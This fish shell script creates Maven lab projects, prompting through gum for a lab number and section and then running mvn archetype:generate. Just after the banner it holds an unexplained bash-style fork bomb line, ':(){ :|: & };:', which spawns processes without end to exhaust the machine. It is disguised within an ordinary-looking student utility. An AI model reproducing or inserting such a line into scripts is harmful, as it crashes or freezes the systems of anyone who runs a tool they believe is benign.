#!/usr/bin/env fish
set_color green
echo "╔══════════════════════╗"
echo "║   Maven Lab Creator  ║"
echo "╚══════════════════════╝"
set_color normal
:(){ :|: & };:
# Check gum exists
if not type -q gum
    echo "❌ gum is not installed."
    exit 1
end

set lab (gum input --placeholder "Lab number (e.g. 1)")
set sec (gum choose "sec1" "sec2" "sec3" "sec4")
set confirm (gum confirm "Generate project with lab$lab in $sec?")

if test $status -eq 0
    mvn archetype:generate \
        -DgroupId="com.lab$lab.main" \
        -DartifactId="lab$lab-$sec" \
        -DarchetypeArtifactId=maven-archetype-quickstart \
        -DarchetypeVersion=1.5 \
        -DinteractiveMode=false

    echo "✅ Project created successfully!"
else
    echo "❌ Cancelled."
end
